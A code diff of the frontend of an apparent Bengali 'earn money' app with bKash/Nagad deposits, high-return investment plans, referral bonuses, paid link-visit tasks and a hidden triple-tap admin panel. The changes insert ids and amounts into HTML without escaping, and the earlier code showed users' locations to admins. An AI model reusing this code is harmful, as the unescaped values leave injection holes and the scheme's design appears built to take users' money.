+    $("promoTasksListContainer").innerHTML = `<div class="admin-note">টাস্ক লোড করতে সমস্যা হয়েছে।</div>`;
   }
 }
 
-async function claimTask(taskId) {
-  if (!currentUser) return;
-  clearMsg("taskMsg");
+async function startPromoTask(taskId, url, requiredSec) {
+  if(!confirm(`এই লিংকে প্রবেশ করে অন্তত ${requiredSec} সেকেন্ড অবস্থান করতে হবে। লিংকে যাবেন কি?`)) return;
 
+  // Inform backend task timer started
   try {
-    const r = await fetch("/api/tasks/claim", {
+    await fetch("/api/promo/start", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ userId: currentUser.id, taskId })
     });
-    const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "Claim failed");
+  } catch(err) {}
 
-    currentUser.balance = d.balance;
-    currentUser.totalEarned = d.totalEarned;
-    localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
-    updateDisplayValues();
+  window.open(url, '_blank');
+  alert(`টাইমার শুরু হয়েছে! ${requiredSec} সেকেন্ড পর ভেরিফাই হবে।`);
 
-    showMsg("taskMsg", `অভিনন্দন! ৳${d.reward} সফলভাবে আপনার ব্যালেন্সে যোগ হয়েছে।`, "success");
-  } catch (err) {
-    showMsg("taskMsg", err.message, "error");
-  }
+  setTimeout(async () => {
+    try {
+      const r = await fetch("/api/promo/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userId: currentUser.id, taskId })
+      });
+      const d = await r.json();
+      if(!r.ok) throw new Error(d.error || "Task Failed");
+
+      currentUser.balance = d.balance;
+      localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
+      updateDisplayValues();
+      alert("Task Completed Successfully! ৳" + d.reward + " যোগ হয়েছে।");
+    } catch(e) {
+      alert("Task Failed: " + e.message);
+    }
+  }, requiredSec * 1000);
 }
 
-// Transaction History Load
+// Navigation Tabs
+function switchTab(tabName) {
+  const panes = ['paneHome', 'paneDeposit', 'paneTasks', 'paneInvest', 'paneWithdraw', 'paneWallet', 'paneProfile'];
+  panes.forEach(p => { const el = $(p); if(el) el.classList.add('hidden'); });
+
+  const navs = ['navHome', 'navDeposit', 'navTasks', 'navInvest', 'navWithdraw', 'navWallet', 'navProfile'];
+  navs.forEach(n => { const el = $(n); if(el) el.className = 'nav-item'; });
+
+  if (tabName === 'home') { $('paneHome').classList.remove('hidden'); $('navHome').className = 'nav-item active'; }
+  else if (tabName === 'deposit') { $('paneDeposit').classList.remove('hidden'); $('navDeposit').className = 'nav-item active'; updateAdminWalletDisplay(); }
+  else if (tabName === 'tasks') { $('paneTasks').classList.remove('hidden'); $('navTasks').className = 'nav-item active'; loadPromoTasks(); }
+  else if (tabName === 'invest') { $('paneInvest').classList.remove('hidden'); $('navInvest').className = 'nav-item active'; renderInvestmentPlans(); }
+  else if (tabName === 'withdraw') { $('paneWithdraw').classList.remove('hidden'); $('navWithdraw').className = 'nav-item active'; }
+  else if (tabName === 'wallet') { $('paneWallet').classList.remove('hidden'); $('navWallet').className = 'nav-item active'; loadTransactions(); }
+  else if (tabName === 'profile') { $('paneProfile').classList.remove('hidden'); $('navProfile').className = 'nav-item active'; updateDisplayValues(); }
+}
+
 async function loadTransactions() {
   if (!currentUser) return;
   try {
     const r = await fetch(`/api/transactions/${currentUser.id}`);
     const d = await r.json();
     const container = $("transactionListContainer");
-
     const allItems = [...(d.transactions || [])];
+
     if (!allItems.length) {
       container.innerHTML = `<div class="admin-note">এখনো কোনো লেনদেন নেই।</div>`;
       return;
@@ -1277,91 +1389,44 @@ async function loadTransactions() {
   }
 }
 
-// Investment Plan
-async function openInvestModal(planDays, profitPercent) {
-  const amount = prompt(`আপনি কত টাকা ইনভেস্ট করতে চান?\n(${planDays} দিন মেয়াদী প্ল্যান, প্রফিট +${profitPercent}%)`);
-  if (!amount) return;
-
-  const numAmount = Number(amount);
-  if (!Number.isFinite(numAmount) || numAmount < 100) {
-    return alert("সর্বনিম্ন ১০০ টাকা ইনভেস্ট করতে হবে।");
-  }
-
-  try {
-    const r = await fetch("/api/invest", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ userId: currentUser.id, planDays, profitPercent, amount: numAmount })
-    });
-    const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "Investment failed");
-
-    currentUser.balance = d.balance;
-    localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
-    updateDisplayValues();
-
-    alert("✅ আপনার ইনভেস্টমেন্ট সফলভাবে একটিভ হয়েছে!");
-  } catch (err) {
-    alert("❌ ত্রুটি: " + err.message);
-  }
-}
-
-// Withdraw Request
 async function submitWithdraw() {
   clearMsg("withdrawMsg");
   const method = $("withdrawMethod").value;
   const number = $("withdrawNumber").value.trim();
-  const amount = $("withdrawAmount").value.trim();
+  const amount = Number($("withdrawAmount").value);
 
   if (!validPhone(number)) return showMsg("withdrawMsg", "সঠিক ১১ ডিজিটের ওয়ালেট নাম্বার দিন।");
-  const numAmount = Number(amount);
-  if (!Number.isFinite(numAmount) || numAmount < 500) {
-    return showMsg("withdrawMsg", "সর্বনিম্ন উইথড্র পরিমাণ ৳৫০০ হতে হবে।");
-  }
-  if (numAmount > (currentUser.balance || 0)) {
-    return showMsg("withdrawMsg", "আপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই।");
-  }
+  if (!Number.isFinite(amount) || amount < 500) return showMsg("withdrawMsg", "সর্বনিম্ন উইথড্র ৳৫০০ হতে হবে।");
+  if (amount > (currentUser.balance || 0)) return showMsg("withdrawMsg", "Insufficient Balance.");
 
   try {
     const r = await fetch("/api/withdraw", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ userId: currentUser.id, method, number, amount: numAmount })
+      body: JSON.stringify({ userId: currentUser.id, method, number, amount })
     });
     const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "Withdraw failed");
+    if (!r.ok) throw new Error(d.error || "Payment Failed");
 
     currentUser.balance = d.balance;
     localStorage.setItem("v2_user_data", JSON.stringify(currentUser));
     updateDisplayValues();
-
-    $("withdrawNumber").value = "";
-    $("withdrawAmount").value = "";
-    showMsg("withdrawMsg", "✅ উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে!", "success");
-  } catch (err) {
-    showMsg("withdrawMsg", err.message, "error");
+    showMsg("withdrawMsg", "Withdrawal Successful!", "success");
+  } catch (e) {
+    showMsg("withdrawMsg", e.message, "error");
   }
 }
 
-function openNotificationModal() {
-  $("notificationModal").classList.add("show");
-}
+function openNotificationModal() { $("notificationModal").classList.add("show"); }
+function logout() { localStorage.removeItem("v2_user_data"); location.reload(); }
 
-function logout() {
-  localStorage.removeItem("v2_user_data");
-  location.reload();
-}
-
-// Admin Trigger (3 taps on shield icon)
 let adminTapCount = 0;
 let adminTapTimer = null;
-
 $("adminTapTarget").addEventListener("click", (e) => {
   e.preventDefault();
   adminTapCount++;
   clearTimeout(adminTapTimer);
   adminTapTimer = setTimeout(() => adminTapCount = 0, 3000);
-
   if (adminTapCount >= 3) {
     adminTapCount = 0;
     $("adminModal").classList.add("show");
@@ -1369,28 +1434,20 @@ $("adminTapTarget").addEventListener("click", (e) => {
   }
 });
 
-$("adminCancel").addEventListener("click", () => {
-  $("adminModal").classList.remove("show");
-  $("adminPin").value = "";
-});
-
+$("adminCancel").addEventListener("click", () => { $("adminModal").classList.remove("show"); $("adminPin").value = ""; });
 $("adminLoginBtn").addEventListener("click", async () => {
   const pin = $("adminPin").value;
-
   try {
     const r = await fetch("/api/admin/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ pin })
     });
-    const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "Login failed");
-
-    $("adminPinMsg").style.display = "none";
+    if (!r.ok) throw new Error("Invalid Information");
     $("adminModal").classList.remove("show");
     $("adminPanel").classList.add("show");
     $("adminPin").value = "";
-    await loadAdminData();
+    loadAdminData();
   } catch (e) {
     showMsg("adminPinMsg", e.message, "error");
   }
@@ -1408,301 +1465,180 @@ function esc(v) {
   }[c]));
 }
 
-function fmtDate(v) {
-  try { return new Date(v).toLocaleString() } catch { return String(v || "") }
-}
-
-let liveAdminData = { users: [], withdrawals: [], investments: [], deposits: [] };
-
 async function loadAdminData() {
   try {
-    const [dr, sr] = await Promise.all([
-      fetch("/api/admin/data"),
-      fetch("/api/admin/settings")
-    ]);
-
-    if (dr.status === 401 || sr.status === 401) {
-      $("adminPanel").classList.remove("show");
-      return;
-    }
-
-    if (!dr.ok || !sr.ok) throw new Error("Data loading failed");
-
+    const [dr, sr] = await Promise.all([fetch("/api/admin/data"), fetch("/api/admin/settings")]);
     const dd = await dr.json();
     const sd = await sr.json();
 
-    liveAdminData.users = dd.registrations || [];
-    liveAdminData.withdrawals = dd.withdrawals || [];
-    liveAdminData.investments = dd.investments || [];
-    liveAdminData.deposits = dd.deposits || [];
-
-    $("statTotal").textContent = dd.total || liveAdminData.users.length;
+    $("statTotal").textContent = dd.total || 0;
     $("statBkash").textContent = dd.bkashCount || 0;
     $("statNagad").textContent = dd.nagadCount || 0;
 
+    $("adminNoticeInput").value = sd.noticeText || "";
+    $("adminNoticeActive").checked = sd.noticeActive !== false;
     $("adminBkashInput").value = sd.adminBkash || "";
     $("adminNagadInput").value = sd.adminNagad || "";
     $("depositActiveToggle").checked = sd.depositEnabled !== false;
 
+    $("adminReqRefs").value = sd.reqRefs || 3;
+    $("adminRefBonus").value = sd.refBonus || 50;
+    $("adminInvestRate").value = sd.investRate || 15;
+    $("adminMinInvest").value = sd.minInvest || 100;
+
     $("telegramChatId").value = sd.telegramChatId || "";
-    $("telegramToken").placeholder = sd.hasTelegramBotToken
-      ? "Token saved (blank = keep current)"
-      : "Paste Bot Token";
+    $("telegramToken").placeholder = sd.hasTelegramBotToken ? "Token saved (blank = keep)" : "Paste Bot Token";
 
-    appGlobalSettings = {
-      adminBkash: sd.adminBkash,
-      adminNagad: sd.adminNagad,
-      depositEnabled: sd.depositEnabled
-    };
-
-    renderAdminDeposits();
-    renderAdminWithdrawals();
-    renderAdminRecords();
-  } catch (err) {
-    alert("অ্যাডমিন প্যানেলের ডেটা লোড হতে ব্যর্থ হয়েছে: " + err.message);
+    renderAdminDeposits(dd.deposits || []);
+    renderAdminPromos(sd.promoTasks || []);
+    renderAdminWithdrawals(dd.withdrawals || []);
+    renderAdminUsers(dd.registrations || []);
+  } catch(e) {
+    alert("Admin data load failed");
   }
 }
 
-function renderAdminDeposits() {
-  const container = $("adminDepositsList");
-  const deps = liveAdminData.deposits;
+async function saveAdminSettings() {
+  const noticeText = $("adminNoticeInput").value.trim();
+  const noticeActive = $("adminNoticeActive").checked;
+  const adminBkash = $("adminBkashInput").value.trim();
+  const adminNagad = $("adminNagadInput").value.trim();
+  const depositEnabled = $("depositActiveToggle").checked;
 
+  await fetch("/api/admin/settings", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ noticeText, noticeActive, adminBkash, adminNagad, depositEnabled })
+  });
+  alert("Settings Saved Successfully!");
+  fetchPublicSettings();
+}
+
+async function saveRefInvSettings() {
+  const reqRefs = Number($("adminReqRefs").value);
+  const refBonus = Number($("adminRefBonus").value);
+  const investRate = Number($("adminInvestRate").value);
+  const minInvest = Number($("adminMinInvest").value);
+
+  await fetch("/api/admin/settings", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ reqRefs, refBonus, investRate, minInvest })
+  });
+  alert("Config Saved Successfully!");
+  fetchPublicSettings();
+}
+
+function renderAdminDeposits(deps) {
+  const container = $("adminDepositsList");
   if (!deps.length) {
     container.innerHTML = `<div class="admin-note">কোনো ডিপোজিট রিকোয়েস্ট নেই।</div>`;
     return;
   }
-
   container.innerHTML = deps.map(dep => `
     <div class="record">
       <div class="record-top">
         <div>
           <h4>${esc(dep.userName)} (${esc(dep.userPhone)})</h4>
           <div class="meta">
-            💳 Method: ${esc(dep.method)}<br>
-            💵 Amount: ৳${esc(dep.amount)}<br>
-            ✍️ TrxID: <b style="color:var(--gold)">${esc(dep.trxId)}</b><br>
-            🕒 Time: ${esc(fmtDate(dep.createdAt))}
+            💳 Method: ${esc(dep.method)} - ৳${esc(dep.amount)}<br>
+            ✍️ TrxID: <b style="color:var(--gold)">${esc(dep.trxId)}</b>
           </div>
         </div>
         <span class="badge ${dep.status === 'Pending' ? 'pending' : (dep.status === 'Rejected' ? 'rejected' : '')}">${esc(dep.status)}</span>
       </div>
       ${dep.status === 'Pending' ? `
         <div class="admin-actions" style="margin-top:10px">
-          <button class="admin-btn admin-green" onclick="updateDepositStatus('${esc(dep.id)}', 'Approved')">Approve</button>
-          <button class="admin-btn admin-red" onclick="updateDepositStatus('${esc(dep.id)}', 'Rejected')">Reject</button>
+          <button class="admin-btn admin-green" onclick="updateDeposit('${dep.id}', 'Approved')">Approve</button>
+          <button class="admin-btn admin-red" onclick="updateDeposit('${dep.id}', 'Rejected')">Reject</button>
         </div>
       ` : ''}
     </div>
   `).join("");
 }
 
-window.updateDepositStatus = async (depositId, status) => {
-  try {
-    const r = await fetch("/api/admin/deposit/update", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ depositId, status })
-    });
-    const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "Status update failed");
-    await loadAdminData();
-    alert(`ডিপোজিট সফলভাবে ${status} করা হয়েছে!`);
-  } catch (err) {
-    alert("ত্রুটি: " + err.message);
-  }
-};
+async function updateDeposit(depositId, status) {
+  const r = await fetch("/api/admin/deposit/update", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ depositId, status })
+  });
+  if(r.ok) loadAdminData();
+}
 
-function renderAdminWithdrawals() {
-  const container = $("adminWithdrawalsList");
-  const wds = liveAdminData.withdrawals;
+async function createPromoTask() {
+  const title = $("promoTitle").value.trim();
+  const url = $("promoUrl").value.trim();
+  const requiredTime = Number($("promoTime").value);
+  const reward = Number($("promoReward").value);
 
-  if (!wds.length) {
-    container.innerHTML = `<div class="admin-note">কোনো উইথড্র রিকোয়েস্ট নেই।</div>`;
-    return;
-  }
+  if(!title || !url) return alert("Invalid Information");
 
-  container.innerHTML = wds.map(w => `
+  await fetch("/api/admin/promo/create", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ title, url, requiredTime, reward })
+  });
+  alert("Task Created Successfully!");
+  loadAdminData();
+}
+
+function renderAdminPromos(tasks) {
+  $("adminPromoList").innerHTML = tasks.map(t => `
     <div class="record">
-      <div class="record-top">
-        <div>
-          <h4>${esc(w.userName)} (${esc(w.userPhone)})</h4>
-          <div class="meta">
-            💳 Method: ${esc(w.method)} - ${esc(w.number)}<br>
-            💵 Amount: ৳${esc(w.amount)}<br>
-            🕒 Time: ${esc(fmtDate(w.createdAt))}
-          </div>
-        </div>
-        <span class="badge ${w.status === 'Pending' ? 'pending' : ''}">${esc(w.status)}</span>
-      </div>
-      ${w.status === 'Pending' ? `
-        <div class="admin-actions" style="margin-top:10px">
-          <button class="admin-btn admin-green" onclick="updateWithdrawStatus('${esc(w.id)}', 'Approved')">Approve</button>
-          <button class="admin-btn admin-red" onclick="updateWithdrawStatus('${esc(w.id)}', 'Rejected')">Reject</button>
-        </div>
-      ` : ''}
+      <h4>${esc(t.title)} (${t.reward}৳)</h4>
+      <button class="admin-btn admin-red" onclick="deletePromo('${t.id}')">Delete</button>
     </div>
   `).join("");
 }
 
-window.updateWithdrawStatus = async (withdrawId, status) => {
-  try {
-    const r = await fetch("/api/admin/withdraw/update", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ withdrawId, status })
-    });
-    if (!r.ok) throw new Error("Status update failed");
-    await loadAdminData();
-    alert(`উইথড্র রিকোয়েস্ট সফলভাবে ${status} করা হয়েছে!`);
-  } catch (err) {
-    alert("ত্রুটি: " + err.message);
-  }
-};
-
-function renderAdminRecords() {
-  const q = $("adminSearch").value.trim().toLowerCase();
-  const filtered = q
-    ? liveAdminData.users.filter(r => [r.name, r.phone, r.paymentNumber, r.paymentMethod]
-        .some(v => String(v || "").toLowerCase().includes(q)))
-    : liveAdminData.users;
-
-  $("adminRecords").innerHTML = filtered.length
-    ? filtered.map(r => {
-        const isComplete = r.status === "complete";
-        const badgeClass = isComplete ? "badge" : "badge pending";
-        const badgeText = isComplete ? "VERIFIED / COMPLETE" : "AWAITING PAYMENT";
-
-        const loc = r.location
-          ? `<a target="_blank" rel="noopener" style="color:#58e8b3" href="https://maps.google.com/?q=${encodeURIComponent(r.location.latitude + "," + r.location.longitude)}">📍 View Location</a>`
-          : "📍 No location";
-
-        return `<div class="record">
-          <div class="record-top">
-            <div>
-              <h4>${esc(r.name)}</h4>
-              <div class="meta">
-                📱 Phone: ${esc(r.phone)}<br>
-                🎂 Age: ${esc(r.age)}<br>
-                💳 Wallet: ${esc(r.paymentMethod || "N/A")} (${esc(r.paymentNumber || "N/A")})<br>
-                💰 Balance: ৳${esc(r.balance || 0)} <button class="admin-btn admin-dark" style="padding:2px 6px;font-size:10px" onclick="editUserBalance('${esc(r.id)}', ${r.balance || 0})">Edit</button><br>
-                ${loc}<br>
-                🕒 Registered: ${esc(fmtDate(r.createdAt))}
-              </div>
-            </div>
-            <span class="${badgeClass}">${badgeText}</span>
-          </div>
-          <div class="admin-actions" style="margin-top:10px">
-            <button class="admin-btn admin-red" onclick="deleteAdminRow('${esc(r.id)}')">Delete Record</button>
-          </div>
-        </div>`;
-      }).join("")
-    : `<div class="admin-note">কোনো ইউজার পাওয়া যায়নি।</div>`;
+async function deletePromo(id) {
+  await fetch("/api/admin/promo/delete", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ id })
+  });
+  loadAdminData();
 }
 
-$("adminSearch").addEventListener("input", renderAdminRecords);
+function renderAdminWithdrawals(wds) {
+  $("adminWithdrawalsList").innerHTML = wds.length ? wds.map(w => `
+    <div class="record">
+      <h4>${esc(w.userName)} - ৳${w.amount} (${esc(w.status)})</h4>
+      ${w.status === 'Pending' ? `<button class="admin-btn admin-green" onclick="updateWithdraw('${w.id}', 'Approved')">Approve</button>` : ''}
+    </div>
+  `).join("") : `<div class="admin-note">কোনো রিকোয়েস্ট নেই।</div>`;
+}
 
-window.editUserBalance = async (userId, currentBal) => {
-  const val = prompt("নতুন ব্যালেন্স পরিমাণ দিন:", currentBal);
-  if (val === null) return;
-  const newBalance = Number(val);
-  if (!Number.isFinite(newBalance)) return alert("সঠিক সংখ্যা দিন।");
+async function updateWithdraw(withdrawId, status) {
+  await fetch("/api/admin/withdraw/update", {
+    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ withdrawId, status })
+  });
+  loadAdminData();
+}
 
-  try {
-    const r = await fetch("/api/admin/user/update-balance", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ userId, newBalance })
-    });
-    if (!r.ok) throw new Error("Update failed");
-    await loadAdminData();
-    alert("ব্যালেন্স আপডেট সফল হয়েছে!");
-  } catch (err) {
-    alert("ত্রুটি: " + err.message);
-  }
-};
-
-window.deleteAdminRow = async id => {
-  if (!confirm("এই রেকর্ড ডিলিট করতে চান?")) return;
-  const r = await fetch("/api/admin/registrations/" + encodeURIComponent(id), { method: "DELETE" });
-  if (r.ok) await loadAdminData();
-};
-
-async function saveAdminSettings() {
-  const adminBkash = $("adminBkashInput").value.trim();
-  const adminNagad = $("adminNagadInput").value.trim();
-  const depositEnabled = $("depositActiveToggle").checked;
-
-  try {
-    const r = await fetch("/api/admin/settings", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ adminBkash, adminNagad, depositEnabled })
-    });
-    const d = await r.json();
-    const m = $("adminSettingsMsg");
-    if(!r.ok) throw new Error(d.error || "Save failed");
-
-    appGlobalSettings.adminBkash = adminBkash;
-    appGlobalSettings.adminNagad = adminNagad;
-    appGlobalSettings.depositEnabled = depositEnabled;
-
-    m.className = "admin-msg ok";
-    m.textContent = "✅ সেটিংস সফলভাবে আপডেট হয়েছে!";
-    m.style.display = "block";
-    setTimeout(() => m.style.display = "none", 4000);
-  } catch(err) {
-    const m = $("adminSettingsMsg");
-    m.className = "admin-msg error";
-    m.textContent = "❌ " + err.message;
-    m.style.display = "block";
-  }
+function renderAdminUsers(users) {
+  $("adminRecords").innerHTML = users.map(u => `
+    <div class="record">
+      <h4>${esc(u.name)} (${esc(u.phone)}) - ৳${u.balance}</h4>
+    </div>
+  `).join("");
 }
 
 $("saveTelegramDemo").addEventListener("click", async () => {
-  const token = $("telegramToken").value.trim();
-  const chatId = $("telegramChatId").value.trim();
-
-  const r = await fetch("/api/admin/settings", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ telegramBotToken: token, telegramChatId: chatId })
+  const telegramBotToken = $("telegramToken").value.trim();
+  const telegramChatId = $("telegramChatId").value.trim();
+  await fetch("/api/admin/settings", {
+    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ telegramBotToken, telegramChatId })
   });
-
-  const d = await r.json();
-  const m = $("telegramDemoMsg");
-
-  if (!r.ok) {
-    m.className = "admin-msg error";
-    m.textContent = d.error || "Save failed";
-    m.style.display = "block";
-    return;
-  }
-
-  $("telegramToken").value = "";
-  m.className = "admin-msg ok";
-  m.textContent = "Telegram settings saved successfully.";
-  m.style.display = "block";
+  alert("Telegram Settings Saved!");
 });
 
 $("testTelegramBtn").addEventListener("click", async () => {
-  const m = $("telegramDemoMsg");
-  m.style.display = "none";
-
-  try {
-    const r = await fetch("/api/admin/telegram/test", { method: "POST" });
-    const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "Test failed");
-
-    m.className = "admin-msg ok";
-    m.textContent = "✅ Test Message Sent to Telegram!";
-    m.style.display = "block";
-  } catch (err) {
-    m.className = "admin-msg error";
-    m.textContent = "❌ Test Failed: " + err.message;
-    m.style.display = "block";
-  }
+  const r = await fetch("/api/admin/telegram/test", { method: "POST" });
+  const d = await r.json();
+  alert(r.ok ? "✅ Test Sent!" : "❌ Error: " + d.error);
 });
 </script>
-
 </body>
 </html>
